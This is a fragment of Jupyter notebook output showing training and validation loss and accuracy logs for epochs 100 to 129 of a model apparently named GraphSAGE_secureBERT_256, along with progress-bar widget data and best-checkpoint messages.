      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9f2b22939244b7d98a166efa64e1532",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:53 | INFO | Epoch 100 | Train Loss: 0.1388 | Train Accuracy: 0.9629\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6a33a2be608a46cc818968264d612aed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:06:55 | INFO | Validation Loss: 0.0933 | Validation Accuracy: 0.9745\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_100_loss_0.0933_acc_0.9745\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43c5f3dc87174d6eac8678791db77071",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:07:15 | INFO | Epoch 101 | Train Loss: 0.1466 | Train Accuracy: 0.9603\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "572293846fce424a83e930ba2392e40b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:07:17 | INFO | Validation Loss: 0.0974 | Validation Accuracy: 0.9732\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5d1096fa460d47cf89530a5524515430",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:07:38 | INFO | Epoch 102 | Train Loss: 0.1299 | Train Accuracy: 0.9651\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fccbc2469b2d4e3bbbc8a182e0fcb9a1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:07:41 | INFO | Validation Loss: 0.0971 | Validation Accuracy: 0.9721\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "61f30325c05d431f8977066fd60a3973",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:00 | INFO | Epoch 103 | Train Loss: 0.1313 | Train Accuracy: 0.9648\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8b715380be664ca298d602ff007d3e5f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:03 | INFO | Validation Loss: 0.1034 | Validation Accuracy: 0.9704\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "851964c7589f47529271258952359439",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:18 | INFO | Epoch 104 | Train Loss: 0.1360 | Train Accuracy: 0.9634\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "099009de3e1746558bdd968eb9b3d246",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:20 | INFO | Validation Loss: 0.0926 | Validation Accuracy: 0.9736\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_104_loss_0.0926_acc_0.9736\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f92f002933e04405992d5300a5f7c0a9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:32 | INFO | Epoch 105 | Train Loss: 0.1422 | Train Accuracy: 0.9617\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3993640cb621477b82eddd5c9ac9512f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:33 | INFO | Validation Loss: 0.1209 | Validation Accuracy: 0.9646\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "37d4b662f8014a3fba21b0d87d1d182a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:45 | INFO | Epoch 106 | Train Loss: 0.1354 | Train Accuracy: 0.9633\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "20ca74c0be7d4a27a823b1ab51510a2d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:47 | INFO | Validation Loss: 0.1062 | Validation Accuracy: 0.9708\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cf56a60d2bed4e8d96812492f91d3f41",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:08:59 | INFO | Epoch 107 | Train Loss: 0.1311 | Train Accuracy: 0.9644\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ec5afd6e4ee4427d8ea42eca40274190",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:00 | INFO | Validation Loss: 0.1087 | Validation Accuracy: 0.9683\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "15afaaa389e144619399909ca21a39d1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:12 | INFO | Epoch 108 | Train Loss: 0.1348 | Train Accuracy: 0.9637\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "eb4b61a1431443eab1b65d8669def6e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:14 | INFO | Validation Loss: 0.1119 | Validation Accuracy: 0.9682\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7199f183b46242adad2cf3da70a113e7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:26 | INFO | Epoch 109 | Train Loss: 0.1376 | Train Accuracy: 0.9629\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4f4d1017dc6f4177a05912fa132b01d2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:28 | INFO | Validation Loss: 0.1160 | Validation Accuracy: 0.9682\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "408f7cc0dd434758adb63974d5a530a0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:41 | INFO | Epoch 110 | Train Loss: 0.1293 | Train Accuracy: 0.9651\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "114c35d903e940629a8fa4b84ac54aac",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:42 | INFO | Validation Loss: 0.1011 | Validation Accuracy: 0.9720\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fa05d0d254f44191a0d70c021f1c4b7e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:55 | INFO | Epoch 111 | Train Loss: 0.1447 | Train Accuracy: 0.9607\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7e0730ef98ec49c3bbd890d011cbe961",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:09:56 | INFO | Validation Loss: 0.1153 | Validation Accuracy: 0.9667\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9225facf97e74569a1e421c2becd0218",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:09 | INFO | Epoch 112 | Train Loss: 0.1431 | Train Accuracy: 0.9611\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2232b98846014ac5a88bbb00a8360b90",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:10 | INFO | Validation Loss: 0.0981 | Validation Accuracy: 0.9719\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e5326ab084424f2bb834488aa52d9716",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:23 | INFO | Epoch 113 | Train Loss: 0.1325 | Train Accuracy: 0.9638\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e081e7e127e14af1a2e6d5ca9894952a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:24 | INFO | Validation Loss: 0.0995 | Validation Accuracy: 0.9714\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a75191dfacc24b0bbad33f34bd992fb4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:37 | INFO | Epoch 114 | Train Loss: 0.1281 | Train Accuracy: 0.9651\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7a4fa9e076654bd1935c41a4a7ee639a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:38 | INFO | Validation Loss: 0.1052 | Validation Accuracy: 0.9683\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3f06fb9eaa8c4076a2a9cdc50a301418",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:50 | INFO | Epoch 115 | Train Loss: 0.1316 | Train Accuracy: 0.9641\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d2d184f92a584ab4845407d57624f8b2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:10:52 | INFO | Validation Loss: 0.0914 | Validation Accuracy: 0.9748\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_115_loss_0.0914_acc_0.9748\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "44def50985d140478071c447ca801971",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:04 | INFO | Epoch 116 | Train Loss: 0.1255 | Train Accuracy: 0.9654\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f24f21ff1bcd4135b610948578af22e9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:05 | INFO | Validation Loss: 0.1059 | Validation Accuracy: 0.9699\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0981335c5295474ab8208882ab1f85ed",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:17 | INFO | Epoch 117 | Train Loss: 0.1312 | Train Accuracy: 0.9638\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5218ef28cb51408ba0a785e36c8679f5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:19 | INFO | Validation Loss: 0.1003 | Validation Accuracy: 0.9702\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e8ebd708fa7c45a9895263a35b59763b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:31 | INFO | Epoch 118 | Train Loss: 0.1316 | Train Accuracy: 0.9639\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1c5773ebf4764cb78845d5864e454628",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:32 | INFO | Validation Loss: 0.0904 | Validation Accuracy: 0.9741\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_118_loss_0.0904_acc_0.9741\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ea4223eccb65450cbd1885929000dca5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:43 | INFO | Epoch 119 | Train Loss: 0.1261 | Train Accuracy: 0.9655\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ab60d381e9344bb3ae5bbb5ef6169acc",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:45 | INFO | Validation Loss: 0.1284 | Validation Accuracy: 0.9625\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0b2d7865454f498081b88ba4ff7007c4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:57 | INFO | Epoch 120 | Train Loss: 0.1256 | Train Accuracy: 0.9653\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a74bfcc1b77d40a3934fffb74a8de91f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:11:59 | INFO | Validation Loss: 0.1120 | Validation Accuracy: 0.9664\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4d424a20f94f46b19f08e91c55c9fe64",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:12 | INFO | Epoch 121 | Train Loss: 0.1243 | Train Accuracy: 0.9655\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a932295f733644de83826ae0e648081f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:13 | INFO | Validation Loss: 0.0975 | Validation Accuracy: 0.9709\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "814897500fb64fdfa89183e3f632ee9a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:26 | INFO | Epoch 122 | Train Loss: 0.1246 | Train Accuracy: 0.9655\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d0447dea27e84e4da379a8b8e8edf250",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:27 | INFO | Validation Loss: 0.0918 | Validation Accuracy: 0.9738\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "860150b1643a472c8c75a401e617c049",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:40 | INFO | Epoch 123 | Train Loss: 0.1190 | Train Accuracy: 0.9669\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ab0898a9ee45484d9a353e3d176843d9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:41 | INFO | Validation Loss: 0.0949 | Validation Accuracy: 0.9729\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a6c207a0dec34195b528e7295db13b4e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:54 | INFO | Epoch 124 | Train Loss: 0.1159 | Train Accuracy: 0.9677\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a5062894ff614601b8bc439ccede2f3a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:12:55 | INFO | Validation Loss: 0.0782 | Validation Accuracy: 0.9772\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_secureBERT_256/epoch_124_loss_0.0782_acc_0.9772\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5af480f142414cfe866f2688a5a4b57e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:07 | INFO | Epoch 125 | Train Loss: 0.1176 | Train Accuracy: 0.9674\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c3c13c61c0ae495bbdc37339cf8f3bd0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:09 | INFO | Validation Loss: 0.0837 | Validation Accuracy: 0.9756\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c0a13c505ccd4533b33704ff2cffa482",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:21 | INFO | Epoch 126 | Train Loss: 0.1207 | Train Accuracy: 0.9662\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d9993b673a7f48be83a542b64564ce57",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:23 | INFO | Validation Loss: 0.0799 | Validation Accuracy: 0.9770\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ead003f282814c748b470a2ad15406c1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:35 | INFO | Epoch 127 | Train Loss: 0.1145 | Train Accuracy: 0.9681\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7ade8f429ec34dddb63bb45cba25bd1c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:37 | INFO | Validation Loss: 0.0871 | Validation Accuracy: 0.9760\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cf4505484da8450abb9ae04f8970b08b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:49 | INFO | Epoch 128 | Train Loss: 0.1164 | Train Accuracy: 0.9678\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "987e26566bbd4bc681d11503af482958",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:13:51 | INFO | Validation Loss: 0.0936 | Validation Accuracy: 0.9737\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "abeadbe92e8b471e907d3aa32a918976",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-02-01 13:14:05 | INFO | Epoch 129 | Train Loss: 0.1083 | Train Accuracy: 0.9699\n"
     ]
    },
    {
     "data": {
